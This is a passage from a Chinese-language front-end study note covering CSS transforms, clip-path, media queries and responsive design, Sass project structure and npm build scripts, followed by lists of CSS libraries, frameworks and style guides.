cy + e</code>\n│ 轉換後的垂直位置：<code>y(prevCoordSys) = bx + dy + f</code>\n│ ex. <code>transform: matrix(1, 0, 0, 1, 100, 100);</code>\n│ 轉換後的水平縮放：<code>s*x = ax + cy + e</code>，<code>s</code> 為比例\n│ 轉換後的垂直縮放：<code>s*y = bx + dy + f</code>，<code>s</code> 為比例\n│ ex. <code>transform: matrix(3, 0, 0, 0.5, 0, 0);</code>\n├ <code>matrix(cosθ, sinθ, -sinθ, cosθ, 0, 0)</code>\n│ 轉換後的水平旋轉：<code>x(prevCoordSys) = x*cosθ - y*sinθ + 0</code>\n│ 轉換後的垂直旋轉：<code>y(prevCoordSys) = x*sinθ + y*cosθ + 0</code>\n│ ex. <code>transform: matrix(0.866025,0.500000,-0.500000,0.866025,0,0);</code>\n├ <code>matrix(1, tan(θy), tan(θx), 1, 0, 0)</code>\n│ 轉換後的水平傾斜：<code>x(prevCoordSys) = x + y*tan(θx) + 0</code>\n│ 轉換後的垂直旋轉：<code>y(prevCoordSys) = x*tan(θy) + y + 0</code>\n└ ex. <code>transform: matrix(1,0,0.75,1,0,0);</code></p>\n</li>\n<li><p><code>matrix3d</code>：使用 16 個參數，以各列序優先排序\n├ <code>matrix3d(a1, b1, c1, d1, a2, b2, c2, d2, a3, b3, c3, d3, a4, b4, c4, d4)</code>\n├ <code>a1 b1 c1 d1 a2 b2 c2 d2 a3 b3 c3 d3</code> 標記線性轉換\n├ <code>a4 b4 c4 d4</code> 標記套用轉換\n├ 數學上的記述為</p>\n<pre class=\"language-\"><code class=\"language-\">  a1 b1 c1 d1       x       a1*x + b1*y + c1*z + d1\n  a2 b2 c2 d2   *   y   =   a2*x + b2*y + c2*z + d2\n  a3 b3 c3 d3       z       a3*x + b3*y + c3*z + d3\n  a4 b4 c4 d4       1       a4*x + b4*y + c4*z + d4</code></pre></li>\n<li><p><code>transform-origin</code>：設定變形的錨定基準點\n├ <code>transform-origin: X軸位置 Y軸位置</code>\n└ 初始 2D 為 <code>50% 50%</code>，3D 為 <code>50% 50% 0</code></p>\n</li>\n<li><p><code>transform-style</code>：設定變形空間\n├ <code>flat</code>：2D 空間，此為預設值\n├ <code>preserve-3d</code>：3D 空間，想使用 3D 變形需設定此參數\n└ 此屬性不會繼承，所有子元素皆需個別設定</p>\n</li>\n<li><p><code>perspective</code>：設定元素的透視距離，僅可套用於子元素上，單位為 <code>px</code>\n└ <code>perspective: 遠近值</code></p>\n</li>\n<li><p><code>perspective-origin</code>：指定 <code>perspective</code> 透視點，預設值為元素中心\n├ <code>perspective-origin: X軸位置 Y軸位置</code>\n└ 可使用具單位的值，或 <code>left</code>、<code>center</code>、<code>right</code>、<code>top</code>、<code>center</code>、<code>bottom</code> 等位置單詞</p>\n</li>\n<li><p><code>transform: perspective()</code>：效果和 <code>perspective</code> 相同，但此設定是套用至所有已變形的 3D 空間子元素\n└ 而 <code>respective</code> 是設定該元素的視覺深度</p>\n</li>\n<li><p><code>backface-visibility</code>：由於 HTML 元素有前後堆疊關係，即使在前方的元素變形（ex. <code>rotateY(180deg)</code>）仍然會蓋過後方的元素\n└ 將此屬性設為 <code>hidden</code> 能讓位居前方的元素轉為背向時隱藏，預設為 <code>visible</code></p>\n</li>\n</ul>\n<h4 id=\"clip-path\">clip-path</h4>\n<ul>\n<li><code>clip-path</code> 可以用來裁切元素，決定其顯示的形狀樣式</li>\n<li>可以使用既有的 SVG 網址，或是內建的圖形 function 指定形狀</li>\n<li><code>clip-path: &lt;clip-source&gt; | [ &lt;basic-shape&gt; || &lt;geometry-box&gt; ] | none</code>\n├ <code>clip-source</code>：SVG 圖形的 URL\n├ <code>basic-shape</code>：基礎圖形 function，有 <code>circle</code>、<code>ellipse</code>、<code>polygon</code>、<code>inset</code>...等圖形可使用\n│ 各個 function parameter 等詳細內容請參照 <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.w3.org/TR/css-shapes-1/#typedef-basic-shape\">CSS Shapes 規範</a> 或 <a target=\"_blank\" rel=\"nofollow\" href=\"https://oreillymedia.github.io/Using_SVG/guide/css-shapes.html\">CSS Shape Functions</a>\n├ <code>geometry-box</code>：搭配 <code>basic-shape</code> 使用的設定參數，提供圖形參照用的盒模型設定\n└ 例如使用 <code>margin-box</code>, <code>border-box</code>, <code>padding-box</code>, <code>content-box</code>...etc. 決定參照點</li>\n<li>範例：<code>polygon(point, point, point, point)</code>\n├ 此例將第一個點的 <code>y</code> 向下平移了 <code>calc(var(--clip-padding) * 2</code>\n└ 剩餘三點則為原本的角落端點，因此整個形狀為一個單斜邊四邊形</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token comment\">/* \n  CSS Tutorial: Create Diagonal Layouts Like It's 2020\n  https://9elements.com/blog/pure-css-diagonal-layouts/ \n*/</span>\n<span class=\"token selector\">.clip-path</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> <span class=\"token function\">calc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">var</span><span class=\"token punctuation\">(</span>--clip-padding<span class=\"token punctuation\">)</span> * -1<span class=\"token punctuation\">)</span> - 2px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token function\">linear-gradient</span><span class=\"token punctuation\">(</span>\n      <span class=\"token function\">rgba</span><span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0.05<span class=\"token punctuation\">)</span> 50%<span class=\"token punctuation\">,</span>\n      0<span class=\"token punctuation\">,</span>\n      transparent 100%\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">linear-gradient</span><span class=\"token punctuation\">(</span>-135deg<span class=\"token punctuation\">,</span> #0cc<span class=\"token punctuation\">,</span> #066<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background-size</span><span class=\"token punctuation\">:</span> 0.5em 0.5em<span class=\"token punctuation\">,</span> 100% 100%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> <span class=\"token function\">calc</span><span class=\"token punctuation\">(</span>\n      <span class=\"token punctuation\">(</span><span class=\"token function\">var</span><span class=\"token punctuation\">(</span>--clip-padding<span class=\"token punctuation\">)</span> * 2<span class=\"token punctuation\">)</span> - <span class=\"token punctuation\">(</span><span class=\"token function\">var</span><span class=\"token punctuation\">(</span>--clip-padding<span class=\"token punctuation\">)</span> - <span class=\"token function\">var</span><span class=\"token punctuation\">(</span>--skew-padding<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span> 0 4em<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">clip-path</span><span class=\"token punctuation\">:</span> <span class=\"token function\">polygon</span><span class=\"token punctuation\">(</span>\n    0% <span class=\"token function\">calc</span><span class=\"token punctuation\">(</span><span class=\"token function\">var</span><span class=\"token punctuation\">(</span>--clip-padding<span class=\"token punctuation\">)</span> * 2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    100% 0%<span class=\"token punctuation\">,</span>\n    100% 100%<span class=\"token punctuation\">,</span>\n    0% 100%\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-webkit-clip-path</span><span class=\"token punctuation\">:</span> <span class=\"token function\">polygon</span><span class=\"token punctuation\">(</span>\n    0% <span class=\"token function\">calc</span><span class=\"token punctuation\">(</span><span class=\"token function\">var</span><span class=\"token punctuation\">(</span>--clip-padding<span class=\"token punctuation\">)</span> * 2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    100% 0%<span class=\"token punctuation\">,</span>\n    100% 100%<span class=\"token punctuation\">,</span>\n    0% 100%\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h2 id=\"7-媒體查詢\">7. 媒體查詢</h2>\n<p>針對不同裝置，套用不同的樣式與適合閱讀的文字大小。</p>\n<h3 id=\"rwd\">RWD</h3>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token atrule\"><span class=\"token rule\">@media</span> screen <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span>條件<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span>條件<span class=\"token punctuation\">)</span> ...</span> <span class=\"token punctuation\">{</span>\n  // 判斷式，用在 screen 螢幕的媒體\n<span class=\"token punctuation\">}</span></code></pre><p>以手機頁面呈現為優先設計，先在手機頁面中將圖片設定為 100%，\n平板或桌機尺寸再用 <code>display: flex</code> 或其他方式做排版。\n如果先寫桌機版再用複寫的設定到手機版，對手機耗電量大，效能比較不好，\n所以都建議先從手機尺寸設計版面。</p>\n<ul>\n<li>常用裝置參數\n├ all\n├ screen\n├ print\n├ Queries\n├ and\n├ not\n└ only</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token atrule\"><span class=\"token rule\">@media</span> <span class=\"token punctuation\">(</span><span class=\"token property\">max-width</span><span class=\"token punctuation\">:</span> 575.99px<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  ...<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@media</span> <span class=\"token punctuation\">(</span><span class=\"token property\">min-width</span><span class=\"token punctuation\">:</span> 576px<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token property\">max-width</span><span class=\"token punctuation\">:</span> 767.99px<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  ...<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@media</span> <span class=\"token punctuation\">(</span><span class=\"token property\">min-width</span><span class=\"token punctuation\">:</span> 768px<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token property\">max-width</span><span class=\"token punctuation\">:</span> 991.99px<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  ...<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@media</span> <span class=\"token punctuation\">(</span><span class=\"token property\">min-width</span><span class=\"token punctuation\">:</span> 992px<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token property\">max-width</span><span class=\"token punctuation\">:</span> 1199.99px<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  ...<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@media</span> <span class=\"token punctuation\">(</span><span class=\"token property\">min-width</span><span class=\"token punctuation\">:</span> 1200px<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  ...<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/articles/10196578\">Day22：小事之 Media Query</a></p>\n<ul>\n<li>設定檢視區（Viewport）\n<code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>\n使用 CSS3 Media queries @media 針對不同寬度的瀏覽器提供適合的頁面樣式</li>\n<li>盡量使用相對寬度</li>\n<li>使用流動性/比例式網格系統</li>\n<li>五大外觀設計模式<ol>\n<li>主體為流動（mostly fluid）</li>\n<li>欄內容下排（column drop）</li>\n<li>版面配置位移（layout shifter）</li>\n<li>微小調整（tiny tweaks）</li>\n<li>畫布外空間利用（off canvas）</li>\n</ol>\n</li>\n<li>使用相對比例的響應式大小圖片與影片</li>\n<li>使用 video 元素來載入、播放影片</li>\n<li>使用多種格式的影片，以便在多種行動平台上播放</li>\n<li>正確設定影片大小，確保你的影片不會超出容器</li>\n<li>無障礙設計很重要：請為 video 元素新增 track 子元素</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>video</span> <span class=\"token attr-name\">controls</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>chrome.webm<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>video/webm<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>chrome.mp4<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>video/mp4<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>Sorry, 您的瀏覽器並不支援 video 元素喔<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>video</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"8-sass\">8. Sass</h2>\n<ul>\n<li>syntactically awesome style sheets</li>\n<li>CSS 預處理器，擴充了如下的各種寫法\n├ variables\n├ nesting（<code>&amp;</code>）\n├ mixins\n├ functions\n├ operations\n├ <code>@include</code>\n├ <code>@extend</code>\n└ <code>@content</code></li>\n</ul>\n<h3 id=\"71-sass-設計模式\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://sass-guidelin.es/#the-7-1-pattern\">7+1 Sass 設計模式</a></h3>\n<pre class=\"language-\"><code class=\"language-\">sass/\n│\n├ base/\n│ ├ _reset.scss # Reset/normalize\n│ ├ _typography.scss # Typography rules\n│ └ ... # Etc…\n│\n├ components/\n│ ├ _buttons.scss # Buttons\n│ ├ _carousel.scss # Carousel\n│ ├ _cover.scss # Cover\n│ ├ _dropdown.scss # Dropdown\n│ └ ... # Etc…\n│\n├ layout/\n│ ├ _navigation.scss # Navigation\n│ ├ _grid.scss # Grid system\n│ ├ _header.scss # Header\n│ ├ _footer.scss # Footer\n│ ├ _sidebar.scss # Sidebar\n│ ├ _forms.scss # Forms\n│ └ ... # Etc…\n│\n├ pages/\n│ ├ _home.scss # Home specific styles\n│ ├ _contact.scss # Contact specific styles\n│ └ ... # Etc…\n│\n├ themes/\n│ ├ _theme.scss # Default theme\n│ ├ _admin.scss # Admin theme\n│ └ ... # Etc…\n│\n├ utils/\n│ ├ _variables.scss # Sass Variables\n│ ├ _functions.scss # Sass Functions\n│ ├ _mixins.scss # Sass Mixins\n│ └ _helpers.scss # Class &amp; placeholders helpers\n│\n├ vendors/\n│ ├ _bootstrap.scss # Bootstrap\n│ ├ _jquery-ui.scss # jQuery UI\n│ └ ... # Etc…\n│\n│\n└ `main.scss` # Main Sass file</code></pre><h3 id=\"編譯成-css\">編譯成 css</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://speakerdeck.com/bcrikko/set-up-sass-development-environment\">決断力を消耗しない Sass 開発環境構築</a></li>\n</ul>\n<ol>\n<li>在專案目錄底下建立 css 與 scss 資料夾\n└ 安裝編譯套件：<code>npm install -D node-sass</code></li>\n<li>在 <code>./package.json</code> 加上 <code>{ &quot;scripts&quot;: { &quot;sass&quot;: &quot;node-sass scss/style.scss css/style.css&quot; }}</code>\n│ 執行 <code>npm run sass</code> 就會進行編譯\n├ 可再加上 <code>-output-style expanded</code> 改善輸出 CSS 結構可視化\n└ 或 <code>-source-map true</code> 在使用開發工具時改為參照 Sass 檔案</li>\n<li>刪除多餘的檔案：<code>npm install -D rimraf</code>\n│ 在 <code>./package.json</code> 加上 <code>{ &quot;scripts&quot;: { &quot;build&quot;: &quot;npm run clean &amp;&amp; npm run sass&quot;, &quot;sass&quot;: &quot;...&quot;, &quot;clean&quot;: &quot;rimraf css&quot; }}</code>，\n└ 執行 <code>npm run build</code> 就會先 clean 再編譯 sass</li>\n<li>監視自動編譯：<code>{ &quot;scripts&quot;: { &quot;watch&quot;: &quot;npm run sass -- --watch&quot;, &quot;build&quot;: &quot;...&quot;, &quot;sass&quot;: &quot;...&quot;, &quot;clean&quot;: &quot;...&quot; }}</code>\n└ 執行 <code>npm run watch</code></li>\n<li>加上前綴詞：<code>npm install -D postcss-cli autoprefixer</code>\n│ 在 <code>./package.json</code> 加上 <code>{ &quot;scripts&quot;: {}, &quot;browserslist: [ &quot;&gt;= 1%&quot;, &quot;ie &gt;= 10&quot;] }</code>\n│ 指定對應國內 1% 以上使用率的瀏覽器和 IE10\n└ 詳細的對應瀏覽器可以參照 <a target=\"_blank\" rel=\"nofollow\" href=\"https://browsersl.ist/\">https://browsersl.ist/</a></li>\n<li>在 <code>./package.json</code> 加上 <code>{ &quot;scripts&quot;: { &quot;watch&quot;: &quot;...&quot;, &quot;build&quot;: &quot;npm run clean &amp;&amp; npm run sass &amp;&amp; npm run autoprefix&quot;, &quot;clean&quot;: &quot;...&quot;, &quot;sass&quot;: &quot;...&quot;, &quot;autoprefix&quot;: &quot;post css --use autoprefixer --map false --output css/style.css css/style.css&quot; }, &quot;browserslist&quot;: [ &quot;...&quot; ]}</code>\n└ <code>npm run build</code> 就會以 clean -&gt; sass -&gt; autoprefixer 的順序執行</li>\n</ol>\n<h2 id=\"9-函式庫、框架\">9. 函式庫、框架</h2>\n<ul>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/rana_kualu/items/5528b34d409b599bf599?utm_campaign=ab79178ee4-Qiita_newsletter_422_08_05_2020&amp;utm_term=0_e44feaa081-ab79178ee4-34565689\">あなたの CSS 力の助けになってくれる素晴らしい Web サイト 12 選 - Qiita</a></p>\n</li>\n<li><p>Library\n├<a target=\"_blank\" rel=\"nofollow\" href=\"https://csslayout.io/\">CSS Layout</a>\n└<a target=\"_blank\" rel=\"nofollow\" href=\"https://freefrontend.com/css-cards/\">85 CSS Cards</a></p>\n</li>\n<li><p>Icon\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://fontawesome.com/\">FontAwesome</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://css.gg/\">CSS Icons</a>\n└ <a target=\"_blank\" rel=\"nofollow\" href=\"https://css-doodle.com/\">css-doodle</a></p>\n</li>\n<li><p>Animation\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://daneden.github.io/animate.css/\">Animate.css</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://wowjs.uk/docs.html\">Wow.js</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/tictail/bounce.js\">Bouncs.js</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/miniMAC/magic\">Magic Animations</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/vzaccaria/DynCSS\">DynCSS</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/elrumordelaluz/csshake\">CSShake</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/IanLunn/Hover\">Hover.css</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/julianshapiro/velocity\">Velocity</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/ejci/favico.js\">favico.js</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/anijs/anijs\">Ani.js</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Mango/slideout\">Slideout</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/sbstjn/timesheet.js\">timesheet.js</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/sampotts/plyr\">plyr</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/maxwellito/vivus\">vivus.js</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/t4t5/SocialButtons\">SocialButtons</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/kenwheeler/slick\">slick</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/liabru/matter-js\">matter.js</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/hilios/jQuery.countdown\">jQuery.countdown</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://oddbird.net/susy/\">Susy</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://connoratherton.com/loaders\">Loaders.css</a>\n└ <a target=\"_blank\" rel=\"nofollow\" href=\"https://loading.io/\">loading.io</a></p>\n</li>\n<li><p>Framework\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://tailwindcss.com/\">Tailwindcss</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://getmdl.io/index.html\">Material Design</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://materializecss.com/\">Materalize</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://purecss.io/\">Pure CSS</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://getbootstrap.com/\">Bootstrap</a>\n│ <a target=\"_blank\" rel=\"nofollow\" href=\"https://pjchender.blogspot.com/2017/10/bs-bootstrap-4-custom-container-and.html\">[BS] Bootstrap 4 自訂容器和欄間距寬度</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://semantic-ui.com/\">Semantic UI</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://foundation.zurb.com/\">Foundation</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://bulma.io/\">Bulma</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://tachyons.io/\">Tachyons</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://primer.style/\">Primer</a>\n├ <a target=\"_blank\" rel=\"nofollow\" href=\"https://sanographix.github.io/rin/\">Rin</a>\n└ <a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@junyiacademy/%E5%88%A9%E7%94%A8-material-ui-%E7%B5%B1%E4%B8%80-ui-framework-%E5%9D%87%E4%B8%80%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB%E5%AE%9C%E9%99%9E%E6%8A%80%E8%A1%93%E5%88%86%E4%BA%AB-1e8595e1b19f\">利用 Material-UI 統一 UI framework——均一前端工程師宜陞技術分享</a></p>\n</li>\n</ul>\n<h3 id=\"關鍵字\">關鍵字</h3>\n<h4 id=\"js\">JS</h4>\n<table>\n<thead>\n<tr>\n<th>中文</th>\n<th>英文</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>箱燈效果</td>\n<td>lightbox</td>\n</tr>\n<tr>\n<td>頁籤</td>\n<td>tab</td>\n</tr>\n<tr>\n<td>幻燈片</td>\n<td>carousel</td>\n</tr>\n<tr>\n<td>對話框</td>\n<td>dialogs, modal</td>\n</tr>\n<tr>\n<td>跑馬燈</td>\n<td>marquee</td>\n</tr>\n<tr>\n<td>畫廊</td>\n<td>gallery</td>\n</tr>\n<tr>\n<td>提示框</td>\n<td>tooltips</td>\n</tr>\n<tr>\n<td>折疊選單</td>\n<td>accordion</td>\n</tr>\n<tr>\n<td>表單驗證</td>\n<td>form validation</td>\n</tr>\n<tr>\n<td>日曆</td>\n<td>datepicker</td>\n</tr>\n<tr>\n<td>滾動視差</td>\n<td>parallax</td>\n</tr>\n<tr>\n<td>滾動條</td>\n<td>scrollbars</td>\n</tr>\n<tr>\n<td>圖表</td>\n<td>chart</td>\n</tr>\n<tr>\n<td>瀑布流</td>\n<td>masonry</td>\n</tr>\n<tr>\n<td>滾動</td>\n<td>scroll</td>\n</tr>\n<tr>\n<td>導覽選單</td>\n<td>navigation, menu</td>\n</tr>\n<tr>\n<td>文字特效</td>\n<td>text effect</td>\n</tr>\n<tr>\n<td>下拉選單</td>\n<td>dropdown</td>\n</tr>\n<tr>\n<td>進度條</td>\n<td>progress bar</td>\n</tr>\n<tr>\n<td>編輯器</td>\n<td>editor</td>\n</tr>\n<tr>\n<td>影片播放器</td>\n<td>video</td>\n</tr>\n<tr>\n<td>倒數計時</td>\n<td>counter</td>\n</tr>\n<tr>\n<td>放大鏡</td>\n<td>zoom</td>\n</tr>\n<tr>\n<td>自動完成</td>\n<td>autocomplete</td>\n</tr>\n</tbody></table>\n<h4 id=\"css\">CSS</h4>\n<table>\n<thead>\n<tr>\n<th>中文</th>\n<th>英文</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>滑動</td>\n<td>hover</td>\n</tr>\n<tr>\n<td>格線系統</td>\n<td>grid</td>\n</tr>\n<tr>\n<td>選單</td>\n<td>menu</td>\n</tr>\n<tr>\n<td>表格</td>\n<td>table</td>\n</tr>\n<tr>\n<td>按鈕</td>\n<td>button</td>\n</tr>\n<tr>\n<td>漸變</td>\n<td>transition</td>\n</tr>\n<tr>\n<td>動畫</td>\n<td>animation</td>\n</tr>\n<tr>\n<td>文字排板</td>\n<td>typography</td>\n</tr>\n<tr>\n<td>分頁</td>\n<td>pagination</td>\n</tr>\n<tr>\n<td>卡片</td>\n<td>card</td>\n</tr>\n<tr>\n<td>星等評價</td>\n<td>star ratings</td>\n</tr>\n<tr>\n<td>網頁字體</td>\n<td>web font</td>\n</tr>\n<tr>\n<td>程式碼</td>\n<td>code</td>\n</tr>\n</tbody></table>\n<h4 id=\"layout\">Layout</h4>\n<table>\n<thead>\n<tr>\n<th>中文</th>\n<th>英文</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>版型</td>\n<td>theme, template</td>\n</tr>\n<tr>\n<td>框架</td>\n<td>framework</td>\n</tr>\n<tr>\n<td>響應式設計</td>\n<td>responsive</td>\n</tr>\n<tr>\n<td>圖示</td>\n<td>icon</td>\n</tr>\n<tr>\n<td>時間軸</td>\n<td>timeline</td>\n</tr>\n<tr>\n<td>麵包屑</td>\n<td>breadcrumb</td>\n</tr>\n<tr>\n<td>標籤</td>\n<td>tag</td>\n</tr>\n<tr>\n<td>速記表</td>\n<td>cheatsheet</td>\n</tr>\n<tr>\n<td>元件、組件</td>\n<td>component</td>\n</tr>\n<tr>\n<td>輔助</td>\n<td>utility</td>\n</tr>\n</tbody></table>\n<h2 id=\"10-版型檢查\">10. 版型檢查</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/doggy8088/CSS-Guidelines\">CSS 筆記、建議與指導方針總整理</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://cssreference.io/\">cssreference.io</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://dailydevlinks.com/css-style-guides/\">CSS Style Guides</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://google.github.io/styleguide/htmlcssguide.html\">Google HTML/CSS Style Guide</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.wan55.co.jp/column/detail/id=485\">Google が推奨する HTML/CSS のスタイルガイドについて</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.github.io/design/2018/10/20/design-guide/\">文件、規範參考 - Material Design</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.gitbooks.io/google_design_translate/content/index.html\">Google Material Design 正體中文版</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/oh_rusty_nail/items/12e5783a9630a6905b1e\">CSSLint の全 32 個のルールをサンプルコードを書きながら解説しました</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/masanarih0ri/items/1c6b856da0bd04bed995\">How to 速度改善 ー Web パフォーマンスについて知っておきたいこと 7 選ー</a></li>\n</ul>\n<ol>\n<li>類別階層不超過四層為原則</li>\n<li>不使用 ID，一律使用 class</li>\n<li>使用 OOCSS 建立類別工具庫</li>\n<li>使用 SMACSS 來建立 Sass 結構</li>\n<li>排版結構以 BEM 來開發</li>\n<li>導入 BS4 的 Grid System</li>\n<li>使用 Sass for 來管理擴充元件</li>\n<li>一率採用小駝峰式命名</li>\n<li>導入第三方插件在 Sass import vendor</li>\n<li>使用 REM 單位</li>\n<li>佈局使用 flexbox 進行元件設計</li>\n</ol>\n<h3 id=\"網頁兼容性\">網頁兼容性</h3>\n<ol>\n<li>跨瀏覽器（Chrome、Firefox、Edge）</li>\n<li>螢幕解析度（1920、1440、1280、1024、768、414、320）</li>\n</ol>\n<h3 id=\"可讀性\">可讀性</h3>\n<ol>\n<li>class（<code>-</code>） 或（<code>_</code>） 自訂規則，注重大小駝峰寫法</li>\n<li>縮排與註解規則</li>\n</ol>\n<h3 id=\"擴充性\">擴充性</h3>\n<ol>\n<li>具有元件化設計觀念（BEM、SMACSS 或自訂規則）</li>\n<li>不輕易影響主體架構（JS hooks）</li>\n</ol>\n<h3 